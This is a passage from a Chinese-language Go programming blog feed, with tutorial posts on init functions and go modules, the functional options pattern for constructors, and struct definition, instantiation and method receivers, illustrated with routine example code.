class="code"><pre><span class="line"><span class="keyword">import</span> f <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">f.Printf(<span class="string">&quot;Hello World\n&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="init初始化函数">init初始化函数</h4><p>在每一个go源文件中，都可以添加如下格式的特殊函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种特殊的函数，不接收任何参数也没有任何返回值，也不可以在代码中主动调用它。当程序启动的时候，init函数会按照package先引入后调用init函数顺序执行</p><p><img src="https://image.icewindy.cn/202302061418246.png" alt="包初始化函数执行顺序示意图"></p><p>每一个包的初始化是先从初始化包级别变量开始的，先初始化变量再执行init初始化函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x <span class="type">int8</span> = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pi = <span class="number">3.14</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">  fmt.Println(<span class="string">&quot;x:&quot;</span>, x)</span><br><span class="line">  fmt.Println(<span class="string">&quot;pi:&quot;</span>, pi)</span><br><span class="line">  sayHi()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayHi</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;你好，世界！&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">x: 10</span></span><br><span class="line"><span class="comment">pi: 3.14</span></span><br><span class="line"><span class="comment">Hello World!</span></span><br><span class="line"><span class="comment">你好，世界！</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="匿名引入">匿名引入</h4><p>如果引入一个包的时候为其设置了一个特殊<code>_</code>作为包名，那么这个包的引入方式就称为匿名引入。</p><p>被匿名引入的包中的<code>init</code>函数将被执行并且仅执行一遍。一个包被引入的目的主要是为了加载这个包，且使得这个包的资源得以初始化。</p><h3 id="go-module">go module</h3><p>Go module 是 Go1.11 版本发布的依赖管理方案，从 Go1.14 版本开始推荐在生产环境使用，于Go1.16版本默认开启。</p><p>由于内容比较长，具体可以查看下面网站了解：</p><p><a href="https://www.liwenzhou.com/posts/Go/package/">https://www.liwenzhou.com/posts/Go/package/</a></p><h4 id="下载依赖包方式">下载依赖包方式</h4><ul><li><p><code>go get</code>手动下载依赖的包，<code>@</code>指定版本。</p><p>下载完成后将会自动记录在<code>go.mod</code>文件中</p></li><li><p>编辑<code>go.mod</code>文件，使用<code>go mod download</code>下载依赖包</p></li></ul><h4 id="go-mod文件">go.mod文件</h4><p><code>go.mod</code>文件中记录了当前项目中所有依赖包的相关信息。</p><p>声明依赖的格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require module/path v1.2.3</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><p>module/path：依赖包的引入路径，一般为一个网址，可以通过<code>replace</code>关键词重导向至本地包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace module/path =&gt; localPath</span><br></pre></td></tr></table></figure></li><li><p>v1.2.3：版本号，有几种格式</p><ul><li>latest：最新版本</li><li>v1.2.3：详细版本号</li><li>commit hash：指定某次commit hash</li></ul></li></ul><h4 id="go-sum文件">go.sum文件</h4><p>这个文件中详细记录了当前项目中引入的依赖包的信息及其hash值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;module&gt; &lt;version&gt; &lt;hash&gt;</span><br><span class="line">&lt;module&gt; &lt;version&gt;/go.mod &lt;hash&gt;</span><br></pre></td></tr></table></figure><p>由于go语言没有中心化分发的包管理机制，因此通过这种方式对依赖包进行校验。</p><h4 id="依赖保存位置">依赖保存位置</h4><p>Go module 会把下载到本地的依赖包会保存在 <code>$GOPATH/pkg/mod</code>目录下，每个依赖包都会带有版本号进行区分，这样就允许在本地存在同一个包的多个不同版本。</p><p><code>go clean -modcache</code> 命令可以清除所有本地已缓存的依赖包数据。</p><h4 id="使用go-module发布包">使用go module发布包</h4><p>本节内容具体也请观看上述文章的内容。</p><ul><li><p>将位于云端的项目clone到本地</p></li><li><p>通过<code>go mod init 仓库地址</code>初始化go项目，注意为<code>github.com/xxx/xxx</code>的样式</p></li><li><p>使用<code>git tag -a 版本号 -m &quot;描述&quot;</code>为发布的包打上标签，命名版本号</p><p>版本号格式：v主版本号.次版本号.修订号</p></li><li><p>最后使用push到github上的远程分支</p></li></ul><p>这样，其他的开发者可以通过我们的仓库地址下载并引用这个包了。</p><p>如果某个发布的版本存在致命缺陷不再想让用户使用时，我们可以使用<code>retract</code>声明废弃的版本。在<code>go.mod</code>中通过这个关键词可对外声明废弃该版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">module github.com/xxx/xxx</span><br><span class="line"></span><br><span class="line">go 1.16</span><br><span class="line"></span><br><span class="line">retract v0.1.1</span><br></pre></td></tr></table></figure><p>Git的使用可以参考我的文章：</p><p><a href="https://www.icewindy.cn/2022/04/19/Git%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/">https://www.icewindy.cn/2022/04/19/Git入门笔记（1）：基本知识与基本操作/</a></p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang实用技巧（1）：option模式封装构造函数</title>
      <link href="/2023/02/03/golang%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7%EF%BC%881%EF%BC%89%EF%BC%9Aoption%E6%A8%A1%E5%BC%8F%E5%B0%81%E8%A3%85%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/"/>
      <url>/2023/02/03/golang%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7%EF%BC%881%EF%BC%89%EF%BC%9Aoption%E6%A8%A1%E5%BC%8F%E5%B0%81%E8%A3%85%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>文章思路来源：</strong>【优雅封装Go结构体构造函数】 <a href="https://www.bilibili.com/video/BV1ky4y1d7eT/?share_source=copy_web&amp;vd_source=09bd1be8229f31f9b1fe4359ac7315ac">https://www.bilibili.com/video/BV1ky4y1d7eT/?share_source=copy_web&amp;vd_source=09bd1be8229f31f9b1fe4359ac7315ac</a></p><h2 id="问题发掘">问题发掘</h2><p>由于go语言中的函数是不支持重载的，导致我们不能直接去实现一个不同实现的构造函数。</p><p>例如我想去实现多个构造函数以实现我们在构造一个结构体实例时有多参数可选，如下我这样做是不被Go语言允许的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Id   <span class="type">int</span></span><br><span class="line">Age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewUser</span><span class="params">(name <span class="type">string</span>)</span></span> *User &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;User&#123;Name: name&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewUser</span><span class="params">(name <span class="type">string</span>, id, age <span class="type">int</span>)</span></span> *User &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;User&#123;</span><br><span class="line">Name: name,</span><br><span class="line">Id: id,</span><br><span class="line">Age: age,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解决方案">解决方案</h2><p>在Go语言中，支持传入的参数是个函数，于是我们可以想到，是否可以通过分开初始化的函数传入构造函数内，达到可选参数的作用呢？这为我们提供了解决的思路</p><p>由此，我们可以引入option模式</p><h3 id="什么是option模式">什么是Option模式</h3><p>Option模式的专业术语为：Functional Options Pattern（函数式选项模式）</p><p>Option模式为golang的开发者提供了将一个函数的参数设置为可选的功能，也就是说我们可以选择参数中的某几个，并且可以按任意顺序传入参数。</p><p>比如我们用option模式实现上面问题的需求：</p><p><strong>User结构体</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> object</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Id   <span class="type">int</span></span><br><span class="line">Age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Option <span class="function"><span class="keyword">func</span><span class="params">(*User)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewUser</span><span class="params">(f ...Option)</span></span> *User &#123;</span><br><span class="line">u := <span class="built_in">new</span>(User)</span><br><span class="line"><span class="keyword">for</span> _, withVar := <span class="keyword">range</span> f &#123;</span><br><span class="line">withVar(u)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> u</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithName</span><span class="params">(name <span class="type">string</span>)</span></span> Option &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(u *User)</span></span> &#123;</span><br><span class="line">u.Name = name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithID</span><span class="params">(id <span class="type">int</span>)</span></span> Option &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(u *User)</span></span> &#123;</span><br><span class="line">u.Id = id</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithAge</span><span class="params">(age <span class="type">int</span>)</span></span> Option &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(u *User)</span></span> &#123;</span><br><span class="line">u.Age = age</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>主函数</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">u1 := object.NewUser(</span><br><span class="line">object.WithName(<span class="string">&quot;IceWindy&quot;</span>),</span><br><span class="line">object.WithID(<span class="number">114</span>),</span><br><span class="line">object.WithAge(<span class="number">18</span>),</span><br><span class="line">)</span><br><span class="line">fmt.Println(u1) <span class="comment">//output: &amp;&#123;IceWindy 114 18&#125;</span></span><br><span class="line"></span><br><span class="line">u2 := object.NewUser(</span><br><span class="line">object.WithID(<span class="number">810</span>),</span><br><span class="line">)</span><br><span class="line">fmt.Println(u2) <span class="comment">//output: &amp;&#123; 810 0&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析代码">分析代码</h3><p>首先看到的是封装的函数类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Option <span class="function"><span class="keyword">func</span><span class="params">(*User)</span></span></span><br></pre></td></tr></table></figure><p>这个函数类型是可选参数的提供的闭包的函数类型，将它封装起来可以使得我们程序具有更好的可读性。接下来我们看到可选参数的这一组代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithName</span><span class="params">(name <span class="type">string</span>)</span></span> Option &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(u *User)</span></span> &#123;</span><br><span class="line">u.Name = name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithID</span><span class="params">(id <span class="type">int</span>)</span></span> Option &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(u *User)</span></span> &#123;</span><br><span class="line">u.Id = id</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithAge</span><span class="params">(age <span class="type">int</span>)</span></span> Option &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(u *User)</span></span> &#123;</span><br><span class="line">u.Age = age</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这组代码传入一个参数，然后返回一个闭包，这个闭包会去设置自己的User的字段，举个例子</p><ul><li>当我们调用一个参数，使用<code>WithName(&quot;IceWindy&quot;)</code>时</li><li>其返回值是一个<code>func(u *User) &#123; u.Name = &quot;IceWindy&quot; &#125;</code></li><li>该返回值会作为参数传入构造函数<code>NewUser(f ...Option)</code>内，将结构体实例的<code>Name</code>设置为<code>&quot;IceWindy&quot;</code></li></ul><p>接下来看到构造函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewUser</span><span class="params">(f ...Option)</span></span> *User &#123; <span class="comment">//使用可变参数接受多个Option函数</span></span><br><span class="line">u := <span class="built_in">new</span>(User) <span class="comment">//得到一个空的结构体实例化地址</span></span><br><span class="line"><span class="keyword">for</span> _, withVar := <span class="keyword">range</span> f &#123; <span class="comment">//使用for range从可变参数中依次执行Option函数</span></span><br><span class="line">withVar(u)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> u</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="后记">后记</h2><p>感觉自己写的思路不是很清晰，网上没有看到比较好的、能理顺一下我的思路的文章，只好大概写成这样。自己大概是理解了，但是写出来有点困难，以后有空再来重构一下这篇文章。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 代码技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（6）：结构体</title>
      <link href="/2023/02/01/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%886%EF%BC%89%EF%BC%9A%E7%BB%93%E6%9E%84%E4%BD%93/"/>
      <url>/2023/02/01/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%886%EF%BC%89%EF%BC%9A%E7%BB%93%E6%9E%84%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<p>Go语言中没有“类”的概念，也不支持“类”的继承等面向对象的概念，它通过结构体的内嵌再配合接口比一般面向对象具有更高的扩展性和灵活性。</p><h2 id="结构体">结构体</h2><p>Go语言中的结构体是一种自定义数据类型，它可以用来封装多个基本数据类型。结构体的英文名称叫<code>struct</code>，与C语言一样，也是通过<code>struct</code>来定义结构体。</p><p>Go语言通过结构体来实现面向对象。</p><h3 id="定义">定义</h3><p>使用type和struct关键字来定义结构体，具体代码格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> 类型名 <span class="keyword">struct</span> &#123;</span><br><span class="line">    字段名 字段类型</span><br><span class="line">    字段名 字段类型</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举个例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="type">string</span></span><br><span class="line">city <span class="type">string</span></span><br><span class="line">age  <span class="type">int8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟以往一样，相同类型字段名可以写在同一行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">name, city <span class="type">string</span></span><br><span class="line">age <span class="type">int8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>语言内置的基础数据类型是用来描述一个值的，而结构体是用来描述一组值的。比如一个人有名字、年龄和居住城市等，本质上是一种聚合型的数据类型。</p><h3 id="实例化">实例化</h3><p>当结构体实例化的时候，才会真正分配内存，且才能使用结构体的字段（类似类与对象）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 结构体实例名 结构体</span><br></pre></td></tr></table></figure><h4 id="基本实例化">基本实例化</h4><p>沿用我们的person结构体</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> p1 person</span><br><span class="line">p1.name = <span class="string">&quot;IceWindy&quot;</span></span><br><span class="line">p1.city = <span class="string">&quot;东莞&quot;</span></span><br><span class="line">p1.age = <span class="number">18</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Go语言访问结构体实例的字段，使用的是类似面向对象语言中的<code>.</code>操作符，而不是C语言中的<code>-&gt;</code>。</p><h4 id="匿名结构体">匿名结构体</h4><p>有些时候我们仅需要临时的定义一些数据结构，这时候就可以用到匿名结构体</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 结构体实例 <span class="keyword">struct</span> &#123;</span><br><span class="line">字段名 字段类型</span><br><span class="line">    字段名 字段类型</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针类型结构体">指针类型结构体</h4><p>我们可以使用new关键字对结构体进行实例化，这种实例化得到的是和结构体的地址</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p2 = <span class="built_in">new</span>(person)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, p2)     <span class="comment">//output: *main.person</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;p2=%#v\n&quot;</span>, p2) <span class="comment">//output: p2=&amp;main.person&#123;name:&quot;&quot;, city:&quot;&quot;, age:0&#125;</span></span><br></pre></td></tr></table></figure><p>从终端打印的结果我们可以看出，p2是一个结构体指针。</p><p>值得注意的是，结构体指针是可以通过<code>.</code>直接访问结构体实例的字段的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p2 = <span class="built_in">new</span>(person)</span><br><span class="line">p2.name = <span class="string">&quot;1ce_Windy&quot;</span></span><br></pre></td></tr></table></figure><h4 id="取结构体的地址实例化">取结构体的地址实例化</h4><p>使用<code>&amp;</code>对结构体进行取地址操作与new关键字实例化结构体是一样的效果，得到的就是一个结构体指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p3 = <span class="built_in">new</span>(person)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, p3)     <span class="comment">//output: *main.person</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;p2=%#v\n&quot;</span>, p3) <span class="comment">//output: p3=&amp;main.person&#123;name:&quot;&quot;, city:&quot;&quot;, age:0&#125;</span></span><br></pre></td></tr></table></figure><h3 id="初始化">初始化</h3><p>从上面的例子我们已经看出没有初始化的结构体，内部字段均为零值。</p><h4 id="使用键值对初始化">使用键值对初始化</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p3 := person&#123;</span><br><span class="line">name: <span class="string">&quot;IceWindy&quot;</span>,</span><br><span class="line">city: <span class="string">&quot;东莞&quot;</span>,</span><br><span class="line">age:  <span class="number">18</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;p3=%#v\n&quot;</span>, p3) <span class="comment">//output: p3=main.person&#123;name:&quot;IceWindy&quot;, city:&quot;东莞&quot;, age:18&#125;</span></span><br></pre></td></tr></table></figure><p>当某些字段暂时不需要初始值时，可以省略不写。没有指定初始值的字段的值为零值。</p><p>同样的方法也可以对<code>&amp;</code>初始化的结构体指针使用</p><h4 id="使用值的列表初始化">使用值的列表初始化</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p4 := person&#123;</span><br><span class="line"><span class="string">&quot;IceWindy&quot;</span>,</span><br><span class="line"><span class="string">&quot;东莞&quot;</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;p4=%#v\n&quot;</span>, p4) <span class="comment">//output: p4=main.person&#123;name:&quot;IceWindy&quot;, city:&quot;东莞&quot;, age:18&#125;</span></span><br></pre></td></tr></table></figure><p>这种方法的初始化有几点需要注意</p><ul><li>必须初始化结构体内的所有字段</li><li>初始值的顺序需与结构体声明顺序一致</li><li>不能与键值对初始化方式混用</li></ul><h3 id="构造函数">构造函数</h3><p>Go语言的结构体是没有构造函数的，如果有需要我们可以自行实现。</p><p>由于<code>struct</code>的实例是值类型，如果结构体比较复杂的话，值拷贝的性能开销会很大，因此可以通过返回结构体指针的方式，减少性能开销</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newPerson</span><span class="params">(name, city <span class="type">string</span>, age <span class="type">int8</span>)</span></span> *person &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;person&#123;</span><br><span class="line">name: name,</span><br><span class="line">city: city,</span><br><span class="line">age: age,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法与接收者">方法与接收者</h3><p>Go语言中的方法是一种作用于特定类型变量的函数。特定类型变量被称作为<code>接收者</code>。</p><p>接收者这个概念类似于其他语言中的<code>this</code>。方法的定义格式如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(接收者变量 接收者类型)</span></span> 方法名(参数列表) (返回参数) &#123;</span><br><span class="line">    函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举个简单的例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p person)</span></span> personSay() &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s say:Hello World\n&quot;</span>, p.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p1 := person&#123;</span><br><span class="line">name: <span class="string">&quot;IceWindy&quot;</span>,</span><br><span class="line">age:  <span class="number">18</span>,</span><br><span class="line">&#125;</span><br><span class="line">p1.personSay()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针类型的接收者">指针类型的接收者</h4><p>指针类型的接收者由一个结构体的指针组成。</p><p>由于指针的特性，调用方法修改时可以修改接收者指针的任意成员变量，在方法结束后，修改都可以得以保留。这种方法更接近于其他语言中面向对象中的<code>this</code>，例如修改结构体内字段等</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *person)</span></span> SetName(name <span class="type">string</span>) &#123;</span><br><span class="line">p.name = name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="值类型的接收者">值类型的接收者</h4><p>当方法作用于值类型接收者时，相当于执行方法时，会克隆一份副本出来，因此任何修改都会仅针对副本，无法修改接收者变量本身</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 